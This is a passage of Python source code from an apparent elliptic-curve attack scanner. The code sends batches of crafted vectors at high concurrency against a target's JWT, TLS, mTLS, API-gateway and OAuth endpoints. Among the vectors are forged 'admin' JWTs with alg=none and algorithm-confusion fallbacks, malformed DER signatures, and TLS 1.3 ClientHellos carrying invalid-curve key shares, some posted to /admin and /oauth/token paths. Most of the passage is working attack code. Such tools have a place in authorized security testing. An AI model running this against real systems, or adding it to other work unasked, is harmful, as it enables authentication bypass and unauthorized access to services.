        representative_vectors = self._select_representative_vectors()
        logger.info(f"Layered strategy: Using {len(representative_vectors)} representative vectors for breadth scan")
        
        total_protocols = len(protocols)
        for i, protocol in enumerate(protocols, 1):
            logger.info(f"Mass testing vectors against {protocol} protocol... ({i}/{total_protocols})")
            
            # Get protocol-specific endpoints
            endpoints = self._get_protocol_endpoints(protocol)
            if not endpoints:
                logger.warning(f"No endpoints found for {protocol}")
                continue
            
            protocol_results = {
                'vectors_tested': 0,
                'anomalies_found': 0,
                'endpoints_tested': len(endpoints),
                'vulnerabilities': [],
                'phase1_results': {},
                'phase2_results': {}
            }
            
            # Phase 1: Breadth-first scanning with representative vectors
            logger.info(f"  Phase 1: Breadth scan - testing {len(representative_vectors)} vectors across {len(endpoints)} endpoints")
            suspicious_endpoints = []
            
            for j, endpoint in enumerate(endpoints, 1):
                logger.info(f"    Breadth scan {j}/{len(endpoints)}: {endpoint}")
                breadth_results = await self._test_vectors_against_endpoint(
                    representative_vectors, endpoint, protocol, is_breadth_scan=True
                )
                
                # Analyze for anomalies/suspicious behavior
                anomaly_score = self._calculate_endpoint_anomaly_score(breadth_results)
                protocol_results['phase1_results'][endpoint] = {
                    'vectors_tested': len(breadth_results),
                    'anomaly_score': anomaly_score,
                    'results': breadth_results
                }
                
                # 优化：更严格的阈值，减少深度扫描的触发
                if anomaly_score >= 5.0:  # 提高阈值: 3.0 -> 5.0
                    suspicious_endpoints.append(endpoint)
                    logger.info(f"    [!] Suspicious endpoint detected: {endpoint} (score: {anomaly_score:.1f})")
                
                protocol_results['vectors_tested'] += len(breadth_results)
            
            # Phase 2: Depth scanning for suspicious endpoints only
            if suspicious_endpoints:
                logger.info(f"  Phase 2: Depth scan - full vector testing on {len(suspicious_endpoints)} suspicious endpoints")
                for j, endpoint in enumerate(suspicious_endpoints, 1):
                    logger.info(f"    Deep scan {j}/{len(suspicious_endpoints)}: {endpoint} with {len(self.attack_vectors)} vectors")
                    depth_results = await self._test_vectors_against_endpoint(
                        self.attack_vectors, endpoint, protocol
                    )
                    
                    protocol_results['phase2_results'][endpoint] = {
                        'vectors_tested': len(depth_results),
                        'results': depth_results
                    }
                    protocol_results['vectors_tested'] += len(depth_results)
            else:
                logger.info(f"  Phase 2: Skipped - no suspicious endpoints found for {protocol}")
            
            # Aggregate results from both phases
            all_endpoint_results = []
            for endpoint_data in protocol_results['phase1_results'].values():
                all_endpoint_results.extend(endpoint_data['results'])
            for endpoint_data in protocol_results['phase2_results'].values():
                all_endpoint_results.extend(endpoint_data['results'])
            
            # Process all results for anomalies and vulnerabilities
            for result in all_endpoint_results:
                if result.anomaly_accepted:
                    protocol_results['anomalies_found'] += 1
                    self.attack_stats['anomalies_accepted'] += 1
                    
                    if result.vulnerability_detected:
                        vulnerability = {
                            'type': f'EC {result.vector} Anomaly',
                            'severity': self._calculate_severity(result),
                            'protocol': protocol,
                            'endpoint': result.target_endpoint,
                            'curve': result.curve,
                            'evidence': result.evidence,
                            'impact': self._get_vulnerability_impact(result)
                        }
                        protocol_results['vulnerabilities'].append(vulnerability)
            
            # Store suspicious endpoints for reporting
            results['layered_strategy']['suspicious_endpoints'].extend(suspicious_endpoints)
            results['layered_strategy']['phase1_breadth'][protocol] = {
                'endpoints_tested': len(endpoints),
                'vectors_per_endpoint': len(representative_vectors),
                'suspicious_found': len(suspicious_endpoints)
            }
            results['layered_strategy']['phase2_depth'][protocol] = {
                'endpoints_tested': len(suspicious_endpoints),
                'vectors_per_endpoint': len(self.attack_vectors) if suspicious_endpoints else 0
            }
            
            results['protocol_results'][protocol] = protocol_results
            results['total_tests'] += protocol_results['vectors_tested']
            results['total_anomalies'] += protocol_results['anomalies_found']
            results['vulnerabilities'].extend(protocol_results['vulnerabilities'])
        
        # Log strategy effectiveness
        total_breadth_tests = sum(data['endpoints_tested'] * data['vectors_per_endpoint'] 
                                for data in results['layered_strategy']['phase1_breadth'].values())
        total_depth_tests = sum(data['endpoints_tested'] * data['vectors_per_endpoint'] 
                              for data in results['layered_strategy']['phase2_depth'].values())
        
        logger.info(f"Layered strategy completed: {total_breadth_tests} breadth tests + {total_depth_tests} depth tests = {total_breadth_tests + total_depth_tests} total")
        logger.info(f"Efficiency gain: avoided {len(protocols) * 15 * 130 - (total_breadth_tests + total_depth_tests)} unnecessary tests")
        
        return results
    
    async def test_protocol_specific_vectors(self, protocol: str) -> Dict[str, Any]:
        """Test protocol-specific attack vectors"""
        results = {
            'protocol': protocol,
            'specific_tests': [],
            'vulnerabilities': []
        }
        
        if protocol == 'jwt':
            jwt_result = await self._test_jwt_ec_vulnerabilities()
            results['specific_tests'].append(jwt_result)
            
        elif protocol == 'tls':
            tls_result = await self._test_tls_ec_vulnerabilities()  
            results['specific_tests'].append(tls_result)
            
        elif protocol == 'mtls':
            mtls_result = await self._test_mtls_ec_vulnerabilities()
            results['specific_tests'].append(mtls_result)
            
        elif protocol == 'api_gateway':
            gateway_result = await self._test_api_gateway_ec_vulnerabilities()
            results['specific_tests'].append(gateway_result)
            
        elif protocol == 'oauth':
            oauth_result = await self._test_oauth_ec_vulnerabilities()
            results['specific_tests'].append(oauth_result)
        
        # Collect vulnerabilities from specific tests
        for test in results['specific_tests']:
            if test.get('vulnerabilities'):
                results['vulnerabilities'].extend(test['vulnerabilities'])
        
        return results
    
    # Note: Arithmetic side-channel attacks are intentionally not implemented here
    # to avoid non-actionable outputs in this tool. A dedicated lab module should
    # provide those with proper measurements.
    
    # Core attack execution methods
    
    async def _test_vectors_against_endpoint(self, vectors: List[AttackVector], 
                                           endpoint: str, protocol: str, is_breadth_scan: bool = False) -> List[AttackResult]:
        """Test attack vectors against specific endpoint
        
        Args:
            vectors: Attack vectors to test
            endpoint: Target endpoint
            protocol: Protocol to use
            is_breadth_scan: If True, use shorter timeout for faster scanning
        """
        results = []
        total_vectors = len(vectors)
        
        # 优化：为广度扫描使用更短的超时
        if is_breadth_scan:
            # 保存原始超时，临时使用短超时
            original_timeout = self.timeout
            self.timeout = min(3.0, self.timeout)  # 广度扫描最多3秒超时
        
        # 优化：显著提高并发数，充分利用代理资源
        semaphore = asyncio.Semaphore(50)  # 大幅增加并发数：20 -> 50
        # Ensure a rate limiter exists
        if not hasattr(self, 'rate_limiter') or self.rate_limiter is None:
            self.rate_limiter = AsyncTokenBucket(rate_per_sec=50.0, capacity=100)  # 增加速率：30 -> 50
        
        async def test_single_vector(vector):
            await self.rate_limiter.acquire()
            async with semaphore:
                return await self._execute_vector_against_endpoint(vector, endpoint, protocol)
        
        # 优化：增大批次，充分利用并发
        batch_size = 100  # 增加批次大小：75 -> 100
        logger.info(f"    Processing {total_vectors} vectors in batches of {batch_size}...")
        
        batch_start_time = time.perf_counter()
        for i in range(0, total_vectors, batch_size):
            batch_end = min(i + batch_size, total_vectors)
            batch_vectors = vectors[i:batch_end]
            batch_num = (i // batch_size) + 1
            total_batches = (total_vectors + batch_size - 1) // batch_size
            
            batch_iter_start = time.perf_counter()
            logger.info(f"    Batch {batch_num}/{total_batches}: Testing vectors {i+1}-{batch_end}/{total_vectors}...")
            
            # Execute current batch concurrently with rate limiting
            tasks = [test_single_vector(vector) for vector in batch_vectors]
            batch_results = await self._gather_with_backoff(tasks)
            
            # Process batch results and track performance
            batch_successes = 0
            batch_anomalies = 0
            for result in batch_results:
                if not isinstance(result, Exception):
                    results.append(result)
                    self.attack_stats['total_attacks'] += 1
                    if result.success:
                        self.attack_stats['successful_attacks'] += 1
                        batch_successes += 1
                    if hasattr(result, 'anomaly_accepted') and result.anomaly_accepted:
                        batch_anomalies += 1
            
            # Performance feedback
            batch_duration = time.perf_counter() - batch_iter_start
            total_duration = time.perf_counter() - batch_start_time
            avg_time_per_vector = (batch_duration * 1000) / len(batch_vectors)
            estimated_total_time = (total_duration / batch_num) * total_batches
            
            logger.info(f"      Batch completed: {batch_successes}/{len(batch_vectors)} successful, "
                       f"{batch_anomalies} anomalies, {batch_duration:.1f}s ({avg_time_per_vector:.0f}ms/vector)")
            
            if batch_num < total_batches:
                eta_seconds = estimated_total_time - total_duration
                logger.info(f"      Progress: {batch_num}/{total_batches} batches, ETA: {eta_seconds:.0f}s")
            else:
                logger.info(f"      Final batch completed in {total_duration:.1f}s total")
        
        # 恢复原始超时（如果是广度扫描）
        if is_breadth_scan:
            self.timeout = original_timeout
        
        return results

    async def _gather_with_backoff(self, coros: List[Any], initial_delay: float = 0.25, max_retries: int = 2):
        results: List[Any] = []
        pending = list(coros)
        attempt = 0
        while pending and attempt <= max_retries:
            batch = await asyncio.gather(*pending, return_exceptions=True)
            retry: List[Any] = []
            for item in batch:
                if isinstance(item, Exception):
                    retry.append(pending[len(results) + len(retry)])
                else:
                    results.append(item)
            if retry:
                await asyncio.sleep(initial_delay * (2 ** attempt))
            pending = retry
            attempt += 1
        # Append any remaining exceptions
        if pending:
            rem = await asyncio.gather(*pending, return_exceptions=True)
            results.extend(rem)
        return results
    
    async def _execute_vector_against_endpoint(self, vector: AttackVector, 
                                             endpoint: str, protocol: str) -> AttackResult:
        """Execute single attack vector against endpoint"""
        # 快速失败机制：跳过已知无响应的endpoint
        if self.endpoint_failures.get(endpoint, 0) >= self.max_endpoint_failures:
            return AttackResult(
                vector=vector.name,
                curve=vector.curve,
                success=False,
                response_code=0,
                response_time=0,
                anomaly_accepted=False,
                vulnerability_detected=False,
                evidence="Endpoint skipped due to repeated failures",
                target_endpoint=endpoint
            )
        
        start_time = time.perf_counter()
        
        try:
            # Protocol-specific payload creation
            if protocol == 'jwt':
                payload = self._create_jwt_payload(vector)
            elif protocol == 'tls':
                payload = self._create_tls_payload(vector)
            elif protocol == 'mtls':
                payload = self._create_mtls_payload(vector)
            elif protocol == 'api_gateway':
                payload = self._create_api_gateway_payload(vector)
            elif protocol == 'oauth':
                payload = self._create_oauth_payload(vector)
            else:
                payload = vector.payload
            
            # Send request
            response = await self._send_protocol_request(payload, endpoint, protocol)
            
            processing_time = (time.perf_counter() - start_time) * 1000
            
            # Analyze response
            anomaly_accepted = self._analyze_anomaly_acceptance(response, vector)
            vulnerability_detected = self._detect_vulnerability(response, vector, protocol)
            evidence = self._extract_evidence(response, vector)
            
            # 重置失败计数（成功响应）
            if response.get('status_code', 0) > 0:
                self.endpoint_failures[endpoint] = 0
            
            return AttackResult(
                vector=vector.name,
                curve=vector.curve.value,
                target_protocol=protocol,
                target_endpoint=endpoint,
                success=response.get('status_code', 0) > 0,
                vulnerability_detected=vulnerability_detected,
                anomaly_accepted=anomaly_accepted,
                response_status=response.get('status_code'),
                response_data=response.get('body', b''),
                processing_time_ms=processing_time,
                evidence=evidence,
                library_fingerprint=self._identify_library_from_response(response)
            )
            
        except Exception as e:
            # 增加失败计数
            self.endpoint_failures[endpoint] = self.endpoint_failures.get(endpoint, 0) + 1
            if self.endpoint_failures[endpoint] >= self.max_endpoint_failures:
                logger.warning(f"Endpoint {endpoint} marked as non-responsive after {self.max_endpoint_failures} failures")
            
            return AttackResult(
                vector=vector.name,
                curve=vector.curve.value,
                target_protocol=protocol,
                target_endpoint=endpoint,
                success=False,
                vulnerability_detected=False,
                error_message=str(e)
            )
    
    # Protocol-specific implementations
    
    async def _test_jwt_ec_vulnerabilities(self) -> Dict[str, Any]:
        """Test JWT EC-specific vulnerabilities"""
        results = {
            'jwt_tests': [],
            'vulnerabilities': [],
            'executed': False
        }
        
        # JWT EC attack scenarios
        jwt_scenarios = [
            {
                'name': 'jwt_algorithm_confusion',
                'description': 'EC algorithm confusion in JWT',
                'attack_type': 'algorithm_substitution'
            },
            {
                'name': 'jwt_curve_substitution', 
                'description': 'Curve parameter substitution in JWT',
                'attack_type': 'curve_confusion'
            },
            {
                'name': 'jwt_signature_malleability',
                'description': 'EC signature malleability in JWT',
                'attack_type': 'signature_forge'
            }
        ]
        
        for scenario in jwt_scenarios:
            jwt_result = await self._execute_jwt_ec_test(scenario)
            results['jwt_tests'].append(jwt_result)
            results['executed'] = results['executed'] or jwt_result.get('executed', True)
            
            if jwt_result.get('vulnerability_detected'):
                results['vulnerabilities'].append({
                    'type': f"JWT EC {scenario['attack_type']}",
                    'severity': 'CRITICAL',
                    'description': scenario['description'],
                    'evidence': jwt_result.get('evidence', [])
                })
        
        return results
    
    async def _test_tls_ec_vulnerabilities(self) -> Dict[str, Any]:
        """Test TLS EC-specific vulnerabilities"""
        results = {
            'tls_tests': [],
            'vulnerabilities': [],
            'executed': False
        }
        
        # TLS EC attack scenarios
        tls_scenarios = [
            {
                'name': 'ecdhe_invalid_public_key',
                'description': 'Invalid ECDHE public key acceptance',
                'attack_type': 'key_validation_bypass'
            },
            {
                'name': 'ecdsa_cert_signature_forge',
                'description': 'ECDSA certificate signature forgery',
                'attack_type': 'certificate_forge'
            }
        ]
        
        for scenario in tls_scenarios:
            tls_result = await self._execute_tls_ec_test(scenario)
            results['tls_tests'].append(tls_result)
            results['executed'] = results['executed'] or tls_result.get('executed', True)
            
            if tls_result.get('vulnerability_detected'):
                results['vulnerabilities'].append({
                    'type': f"TLS EC {scenario['attack_type']}",
                    'severity': 'HIGH',
                    'description': scenario['description'],
                    'evidence': tls_result.get('evidence', [])
                })
        
        return results
    
    async def _test_mtls_ec_vulnerabilities(self) -> Dict[str, Any]:
        """Perform a real TLS handshake requiring client cert if server demands it; report behavior."""
        result = {'mtls_tests': [], 'vulnerabilities': []}
        try:
            # Attempt handshake without client cert; servers that strictly require mTLS should respond with alert
            ch = self._build_tls13_client_hello(self.target_host, [])
            resp = await self._send_tls_request(ch, 'tls_handshake')
            result['mtls_tests'].append({'without_client_cert': resp.get('status_code', 0)})
        except Exception as e:
            result['mtls_tests'].append({'without_client_cert_error': str(e)})
        return result
    
    async def _test_api_gateway_ec_vulnerabilities(self) -> Dict[str, Any]:
        """Send signed JWT to likely admin endpoints and observe acceptance."""
        results = {'api_gateway_tests': [], 'vulnerabilities': [], 'executed': False}
        endpoints = [ep for ep in self.discovered_endpoints if any(x in ep for x in ['/api', '/admin', '/gateway'])]
        if not endpoints:
            results['executed'] = False
            return results
        try:
            # Try algorithm confusion first
            token = self._create_alg_confusion_jwt() or self._create_jwt_payload(AttackVector(name='api_gateway_probe', curve=CurveType.P256, anomaly_type='none', description='', payload=b'', expected_behavior='', severity='LOW'))
            req = (
                f"POST {endpoints[0]} HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"Authorization: Bearer {token.decode()}\r\n"
                f"Content-Length: 0\r\nConnection: close\r\n\r\n"
            ).encode()
            resp = await self._send_http_request(req, endpoints[0], 'api_gateway')
            results['api_gateway_tests'].append({'endpoint': endpoints[0], 'status': resp.get('status_code', 0)})
            results['executed'] = True
        except Exception as e:
            results['api_gateway_tests'].append({'endpoint': endpoints[0], 'error': str(e)})
            results['executed'] = True
        return results
    
    async def _test_oauth_ec_vulnerabilities(self) -> Dict[str, Any]:
        """Attempt RFC 7523 client assertion (JWT bearer) token request and observe response."""
        results = {'oauth_tests': [], 'vulnerabilities': [], 'executed': False}
        token_ep = None
        for ep in ['/oauth/token', '/token', '/connect/token']:
            if ep in self.discovered_endpoints:
                token_ep = ep
                break
        if not token_ep:
            results['executed'] = False
            return results
        # Build client assertion JWT (prefer algorithm confusion if possible)
        now = int(time.time())
        claims = {
            'iss': 'ec-aoe-client',
            'sub': 'ec-aoe-client',
            'aud': f"https://{self.target_host}{token_ep}",
            'iat': now,
            'exp': now + 300,
            'jti': base64.urlsafe_b64encode(secrets.token_bytes(16)).decode().rstrip('=')
        }
        assertion_bytes = self._create_alg_confusion_jwt(custom_claims=claims)
        if not assertion_bytes:
            header = {'alg': 'ES256', 'typ': 'JWT'}
            header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(claims, separators=(',', ':')).encode()).decode().rstrip('=')
            signing_input = f"{header_b64}.{payload_b64}".encode()
            assertion_bytes = signing_input + b'.'
            if CRYPTO_AVAILABLE:
                try:
                    private_key = ec.generate_private_key(ec.SECP256R1())
                    der_sig = private_key.sign(signing_input, ec.ECDSA(hashes.SHA256()))
                    from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
                    r, s = decode_dss_signature(der_sig)
                    bl = (private_key.curve.key_size + 7) // 8
                    sig = base64.urlsafe_b64encode(r.to_bytes(bl, 'big') + s.to_bytes(bl, 'big')).decode().rstrip('=')
                    assertion_bytes = f"{header_b64}.{payload_b64}.{sig}".encode()
                except Exception:
                    pass
        body = (
            "grant_type=client_credentials&client_assertion_type="
            "urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion="
            + assertion_bytes.decode()
        ).encode()
        try:
            resp = await self._send_http_request(body, token_ep, 'oauth')
            results['oauth_tests'].append({'endpoint': token_ep, 'status': resp.get('status_code', 0)})
            results['executed'] = True
        except Exception as e:
            results['oauth_tests'].append({'endpoint': token_ep, 'error': str(e)})
            results['executed'] = True
        return results
    
    # Helper methods for attack vector generation
    
    def _generate_valid_point(self, curve: CurveType) -> Optional[ECPoint]:
        """Generate a valid point on the specified curve"""
        try:
            curve_params = CURVE_REGISTRY[curve]
            
            # Start with generator point
            return ECPoint(
                x=curve_params.gx,
                y=curve_params.gy,
                curve=curve,
                encoding=PointEncoding.UNCOMPRESSED
            )
        except Exception as e:
            logger.debug(f"Failed to generate valid point for {curve.value}: {e}")
            return None

    def _populate_brainpool_params_if_missing(self) -> None:
        """Populate Brainpool parameters from system OpenSSL if not already present."""
        import subprocess
        name_map = {
            CurveType.BP256: ("brainpoolP256r1", 256),
            CurveType.BP384: ("brainpoolP384r1", 384),
            CurveType.BP512: ("brainpoolP512r1", 512),
        }
        for ctype, (openssl_name, bits) in name_map.items():
            if ctype in CURVE_REGISTRY:
                continue
            try:
                out = subprocess.check_output([
                    "openssl", "ecparam", "-name", openssl_name, "-param_enc", "explicit", "-text"
                ], stderr=subprocess.DEVNULL).decode()
            except Exception:
                continue
            def parse_hex_block(label: str) -> str:
                idx = out.find(label)
                if idx < 0:
                    return ""
                lines = []
                for line in out[idx:].splitlines()[1:]:
                    line = line.strip()
                    if not line or ':' not in line:
                        break
                    lines.append(line.replace(":", "").replace(" ", ""))
                hexstr = ''.join(lines)
                if hexstr.startswith('00'):
                    hexstr = hexstr[2:]
                return hexstr
            p_hex = parse_hex_block("Prime:")
            a_hex = parse_hex_block("A:")
            b_hex = parse_hex_block("B:")
            # Generator block
            g_idx = out.find("Generator (uncompressed):")
            gx = gy = 0
            if g_idx >= 0:
                g_lines = []
                for line in out[g_idx:].splitlines()[1:]:
                    line = line.strip()
                    if not line or line.startswith("Order"):
                        break
                    g_lines.append(line.replace(":", "").replace(" ", ""))
                g_hex = ''.join(g_lines)
                if g_hex.startswith('04'):
                    g_hex = g_hex[2:]
                byte_len = (bits + 7) // 8
                gx_hex = g_hex[:byte_len*2]
                gy_hex = g_hex[byte_len*2:byte_len*4]
                gx = int(gx_hex, 16)
                gy = int(gy_hex, 16)
            ord_hex = parse_hex_block("Order:")
            cof_line = None
            for line in out.splitlines():
                if line.strip().startswith("Cofactor:"):
                    cof_line = line
                    break
            h_val = 1
            if cof_line:
                try:
                    h_val = int(cof_line.split()[1])
                except Exception:
                    h_val = 1
            try:
                CURVE_REGISTRY[ctype] = CurveParameters(
                    name=openssl_name,
                    p=int(p_hex, 16),
                    a=int(a_hex, 16),
                    b=int(b_hex, 16),
                    gx=gx,
                    gy=gy,
                    n=int(ord_hex, 16),
                    h=h_val,
                    bit_size=bits,
                    form="weierstrass"
                )
            except Exception:
                continue
    
    def _create_malformed_der(self, point: ECPoint, attack_type: str) -> bytes:
        """Create malformed DER-encoded ECDSA signature following ASN.1 rules where applicable."""
        curve_params = CURVE_REGISTRY[point.curve]
        byte_length = (curve_params.bit_size + 7) // 8
        # Use fixed r,s derived from point coordinates for determinism
        r = (point.x or 1) % curve_params.n
        s = (point.y or 1) % curve_params.n
        r_bytes = r.to_bytes(byte_length, 'big') or b'\x00'
        s_bytes = s.to_bytes(byte_length, 'big') or b'\x00'
        # Minimal DER integers
        def der_int(xb: bytes) -> bytes:
            xb2 = xb.lstrip(b'\x00') or b'\x00'
            if xb2[0] & 0x80:
                xb2 = b'\x00' + xb2
            return b'\x02' + bytes([len(xb2)]) + xb2
        r_der = der_int(r_bytes)
        s_der = der_int(s_bytes)
        seq = r_der + s_der
        der = b'\x30' + bytes([len(seq)]) + seq
        if attack_type == 'leading_zeros':
            # Add superfluous leading zero to r integer content
            rb = r_bytes if r_bytes and r_bytes[0] < 0x80 else (b'\x00' + r_bytes)
            rb = b'\x00' + rb
            r_alt = b'\x02' + bytes([len(rb)]) + rb
            seq2 = r_alt + s_der
            return b'\x30' + bytes([len(seq2)]) + seq2
        if attack_type == 'negative_encoding':
            # Force sign bit on r without proper padding
            rb = r_bytes.lstrip(b'\x00') or b'\x00'
            if rb[0] & 0x80 == 0:
                rb = bytes([rb[0] | 0x80]) + rb[1:]
            r_alt = b'\x02' + bytes([len(rb)]) + rb
            seq2 = r_alt + s_der
            return b'\x30' + bytes([len(seq2)]) + seq2
        if attack_type == 'minimal_encoding':
            # Remove needed leading zero from negative number (break minimality)
            rb = r_bytes
            if rb and rb[0] == 0x00:
                rb = rb[1:]
            r_alt = b'\x02' + bytes([len(rb)]) + rb
            seq2 = r_alt + s_der
            return b'\x30' + bytes([len(seq2)]) + seq2
        if attack_type == 'oversized_length':
            # Use long-form length for SEQUENCE
            return b'\x30\x81' + bytes([len(seq)]) + seq
        if attack_type == 'indefinite_length':
            # Indefinite length is not allowed in DER; emulate BER-style (invalid for DER)
            return b'\x30\x80' + r_der + s_der + b'\x00\x00'
        return der
    
    def _encode_ecdsa_signature(self, r: int, s: int, curve: CurveType) -> bytes:
        """Encode ECDSA signature in DER format"""
        curve_params = CURVE_REGISTRY[curve]
        byte_length = (curve_params.bit_size + 7) // 8
        
        # Convert to bytes
        r_bytes = r.to_bytes(byte_length, 'big')
        s_bytes = s.to_bytes(byte_length, 'big')
        
        # Remove leading zeros for minimal DER
        r_bytes = r_bytes.lstrip(b'\x00') or b'\x00'
        s_bytes = s_bytes.lstrip(b'\x00') or b'\x00'
        
        # Add sign bit padding if needed
        if r_bytes[0] & 0x80:
            r_bytes = b'\x00' + r_bytes
        if s_bytes[0] & 0x80:
            s_bytes = b'\x00' + s_bytes
        
        # Build DER SEQUENCE
        r_der = b'\x02' + bytes([len(r_bytes)]) + r_bytes
        s_der = b'\x02' + bytes([len(s_bytes)]) + s_bytes
        
        signature = r_der + s_der
        return b'\x30' + bytes([len(signature)]) + signature
    
    def _convert_to_coordinate_system(self, point: ECPoint, coord_system: CoordinateSystem) -> bytes:
        """Convert point to different coordinate system representation"""
        if coord_system == CoordinateSystem.AFFINE:
            return point.to_bytes(compressed=False)
        elif coord_system == CoordinateSystem.JACOBIAN:
            # Jacobian coordinates (X, Y, Z) where x=X/Z^2, y=Y/Z^3
            # Use Z=2 for testing
            z = 2
            x_jacobian = (point.x * (z * z)) % CURVE_REGISTRY[point.curve].p
            y_jacobian = (point.y * (z * z * z)) % CURVE_REGISTRY[point.curve].p
            
            curve_params = CURVE_REGISTRY[point.curve]
            byte_length = (curve_params.bit_size + 7) // 8
            
            # Encode as X||Y||Z
            x_bytes = x_jacobian.to_bytes(byte_length, 'big')
            y_bytes = y_jacobian.to_bytes(byte_length, 'big') 
            z_bytes = z.to_bytes(byte_length, 'big')
            
            return b'\x05' + x_bytes + y_bytes + z_bytes  # Custom prefix for Jacobian
        else:
            # Fallback to uncompressed
            return point.to_bytes(compressed=False)
    
    def _tonelli_shanks(self, n: int, p: int) -> Optional[int]:
        """Tonelli-Shanks algorithm for modular square root"""
        n %= p
        if n == 0:
            return 0
        # Legendre symbol check (Euler's criterion)
        if pow(n, (p - 1) // 2, p) != 1:
            return None
        # Fast path for p % 4 == 3
        if p & 3 == 3:
            return pow(n, (p + 1) // 4, p)
        # Factor p-1 = q * 2^s with q odd
        q = p - 1
        s = 0
        while q % 2 == 0:
            q //= 2
            s += 1
        # Find a quadratic non-residue z
        z = 2
        while pow(z, (p - 1) // 2, p) != p - 1:
            z += 1
        c = pow(z, q, p)
        x = pow(n, (q + 1) // 2, p)
        t = pow(n, q, p)
        m = s
        while t != 1:
            # Find lowest i (0 < i < m) such that t^{2^i} == 1
            i = 1
            t2i = (t * t) % p
            while i < m and t2i != 1:
                t2i = (t2i * t2i) % p
                i += 1
            if i == m:
                return None
            b = pow(c, 1 << (m - i - 1), p)
            x = (x * b) % p
            t = (t * b * b) % p
            c = (b * b) % p
            m = i
        return x
    
    # Protocol payload creation methods
    
    def _create_jwt_payload(self, vector: AttackVector) -> bytes:
        """Create a real JWS (JWT) with appropriate EC algorithm using cryptography.
        Falls back to unsigned token if crypto backend not available.
        """
        alg_map = {
            CurveType.P256: ("ES256", ec.SECP256R1()),
            CurveType.P384: ("ES384", ec.SECP384R1()),
            CurveType.P521: ("ES512", ec.SECP521R1()),
            CurveType.SECP256K1: ("ES256K", ec.SECP256K1()),
            CurveType.ED25519: ("EdDSA", None),
        }
        alg, curve_obj = alg_map.get(vector.curve, ("ES256", ec.SECP256R1()))

        header = {"alg": alg, "typ": "JWT"}
        payload_data = {"sub": "admin", "role": "administrator", "iat": int(time.time()), "exp": int(time.time()) + 3600}

        header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data, separators=(',', ':')).encode()).decode().rstrip('=')
        signing_input = f"{header_b64}.{payload_b64}".encode()

        if not CRYPTO_AVAILABLE:
            # Produce a standards-compliant unsecured JWT (alg="none")
            header_none = {"alg": "none", "typ": "JWT"}
            header_b64_none = base64.urlsafe_b64encode(json.dumps(header_none, separators=(',', ':')).encode()).decode().rstrip('=')
            return f"{header_b64_none}.{payload_b64}.".encode()

        try:
            if alg == "EdDSA":
                private_key = ed25519.Ed25519PrivateKey.generate()
                signature = private_key.sign(signing_input)
            else:
                private_key = ec.generate_private_key(curve_obj)
                der_sig = private_key.sign(signing_input, ec.ECDSA(hashes.SHA256()))
                # Convert DER to P1363 (r||s) for JOSE
                from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature
                r, s = decode_dss_signature(der_sig)
                byte_len = (private_key.curve.key_size + 7) // 8
                signature = r.to_bytes(byte_len, 'big') + s.to_bytes(byte_len, 'big')
            signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            return f"{header_b64}.{payload_b64}.{signature_b64}".encode()
        except Exception:
            return (signing_input + b".")
    
    def _create_tls_payload(self, vector: AttackVector) -> bytes:
        """Build a real TLS 1.3 ClientHello with a crafted KeyShare using the attack vector."""
        group = self._tls_named_group_for_curve(vector.curve)
        if group is None:
            # No deceptive fallback: build ClientHello without KeyShare (server may HRR/alert)
            return self._build_tls13_client_hello(self.target_host, [])
        key_exchange = self._tls_key_exchange_bytes(vector, group)
        return self._build_tls13_client_hello(self.target_host, [(group, key_exchange)])

    def _tls_named_group_for_curve(self, curve: CurveType) -> Optional[int]:
        mapping = {
            CurveType.P256: 0x0017,      # secp256r1
            CurveType.P384: 0x0018,      # secp384r1
            CurveType.P521: 0x0019,      # secp521r1
            CurveType.SECP256K1: 0x0016, # secp256k1 (IANA Supported Groups)
            CurveType.BP256: 0x001A,     # brainpoolP256r1
            CurveType.BP384: 0x001B,     # brainpoolP384r1
            CurveType.BP512: 0x001C,     # brainpoolP512r1
            CurveType.CURVE25519: 0x001D, # x25519
            CurveType.CURVE448: 0x001E   # x448
        }
        return mapping.get(curve)

    def _tls_key_exchange_bytes(self, vector: AttackVector, group_id: int) -> bytes:
        curve_params = CURVE_REGISTRY.get(vector.curve)
        if curve_params and curve_params.form == "weierstrass":
            # TLS 1.3 expects uncompressed SEC1 ECPoint for NIST curves
            return bytes(vector.payload)
        if group_id == 0x001D:  # x25519
            # x25519 expects 32-byte X coordinate
            data = bytes(vector.payload)
            if len(data) < 32:
                data = data + b"\x00" * (32 - len(data))
            return data[:32]
        if group_id == 0x001E:  # x448
            data = bytes(vector.payload)
            if len(data) < 56:
                data = data + b"\x00" * (56 - len(data))
            return data[:56]
        # Fallback: use payload as-is
        return bytes(vector.payload)

    def _build_tls13_client_hello(self, sni: str, keyshare_entries: List[Tuple[int, bytes]]) -> bytes:
        def u8(x):
            return struct.pack('!B', x)
        def u16(x):
            return struct.pack('!H', x)
        def u24(x):
            return struct.pack('!I', x)[1:]

        legacy_version = b"\x03\x03"
        random = secrets.token_bytes(32)
        session_id = b""  # length 0
        # Cipher suites
        cipher_suites = b"\x13\x01\x13\x02\x13\x03"  # TLS_AES_128_GCM_SHA256, _256_, CHACHA20
        cipher_vec = u16(len(cipher_suites)) + cipher_suites
        comp_methods = b"\x01\x00"  # 1 method: null
        # Extensions
        ext_list = b""
        # server_name
        if sni:
            host_bytes = sni.encode('idna')
            sni_entry = b"\x00" + u16(len(host_bytes)) + host_bytes
            sni_list = u16(len(sni_entry)) + sni_entry
            ext_list += u16(0) + u16(len(sni_list)) + sni_list
        # supported_versions (43)
        versions = b"\x03\x04\x03\x03"  # TLS1.3, TLS1.2
        versions_vec = u8(len(versions)) + versions
        ext_list += u16(43) + u16(len(versions_vec)) + versions_vec
        # supported_groups (10)
        groups = (
            b"\x00\x1d"  # x25519
            b"\x00\x1e"  # x448
            b"\x00\x17"  # secp256r1
            b"\x00\x18"  # secp384r1
            b"\x00\x19"  # secp521r1
            b"\x00\x16"  # secp256k1
            b"\x00\x1a"  # brainpoolP256r1
            b"\x00\x1b"  # brainpoolP384r1
            b"\x00\x1c"  # brainpoolP512r1
        )
        groups_vec = u16(len(groups)) + groups
